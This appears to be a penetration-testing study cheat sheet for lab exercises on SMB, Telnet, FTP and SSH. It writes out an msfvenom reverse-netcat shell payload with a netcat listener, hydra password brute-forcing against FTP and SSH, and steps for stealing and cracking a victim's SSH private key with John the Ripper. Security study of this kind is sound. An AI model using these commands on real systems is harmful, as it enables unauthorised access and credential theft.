# Network Services

## SMB - Server Message Block Protocol -  
[SMB](https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.   

### Enumerating SMB
- Port Scanning
    nmap 
- Enum4Linux
    `enum4linux [options] [ip]`  
    `-U` get userlist  
    `-M` get machine list  
    `-N` get namelist dump (different from -U and-M)  
    `-S` get sharelist  
    `-P` get password policy information  
    `-G` get group and member list  
    `-a` all of the above (full basic enumeration)  

### Exploiting SMB
While there are vulnerabilities such as [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/) that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system.  
- SMBClient
    `smbclient //[IP]/[SHARE]`  
    `-U [name]` : to specify the user  
    `-p [port]` : to specify the port  

## Telnet
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.  
`telnet [ip] [port]`  

### Exploiting Telnet
- https://www.cvedetails.com/
- https://cve.mitre.org/  
However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.  
`sudo tcpdump ip proto \\icmp -i tun0`  
`"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"`  
`"nc -lvp [listening port]"`  

## FTP - File Transfer Protocol -
FTP is a protocol used to allow remote transfer of files over a network.  
A typical FTP session operates using two channels:
- a command (sometimes called the control) channel
- a data channel.  

The FTP server may support either Active or Passive connections, or both.  
- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.   

### Exploiting FTP
#### hydra
`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`  
`hydra` Runs the hydra tool  
`-t 4`  Number of parallel connections per target    
`-l [user]` Points to the user who's account you're trying to compromise  
`-P [path to dictionary]`   Points to the file containing the list of possible passwords  
`-vV`   Sets verbose mode to very verbose, shows the login+pass combination for each attempt  
`[machine IP]`  The IP address of the target machine  
`ftp / protocol`    Sets the protocol  

## SSH
### Exploiting SSH
#### Crack SSH Password with hydra  
`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ssh`  

#### Crack SSH Private Key with John the Ripper
SSH Key-Based Autherntication
1. RSA-Private-key is in .ssh derectory. (id_rsa)
```
victim@target:~/.ssh$ ls -la

total 16
drwx------ 2 nullbyte nullbyte 4096 2019-06-19 13:49 .
drwxr-xr-x 3 nullbyte nullbyte 4096 2019-06-19 13:46 ..
-rw------- 1 nullbyte nullbyte 1743 2019-06-19 13:49 id_rsa
-rw-r--r-- 1 nullbyte nullbyte  405 2019-06-19 13:49 id_rsa.pub
```  
2. `cat id_rsa` and copy, `nano victim_rsa` and paste.
3. Crack the Private Key.  
    `$ python3 /usr/share/john/ssh2john.py victim_rsa > rsa.hash`  
    `$ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash`
    <detail>
    ```
    $ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
    Using default input encoding: UTF-8
    Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
    Cost 2 (iteration count) is 1 for all loaded hashes
    Press 'q' or Ctrl-C to abort, almost any other key for status
    beeswax          (id_rsa)
    1g 0:00:00:00 DONE (2023-07-27 15:52) 16.66g/s 1378Kp/s 1378Kc/s 1378KC/s beeswax
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.
    ```
    </detail>  
    `$ john --show rsa.hash`  
4. SSH into the Target.
    `$ chmod 600 victim_rsa`  
    `$ ssh -i victim_rsa victim@<TARGET_IP>`  
    Enter passphrase. (in this case "beeswax")  






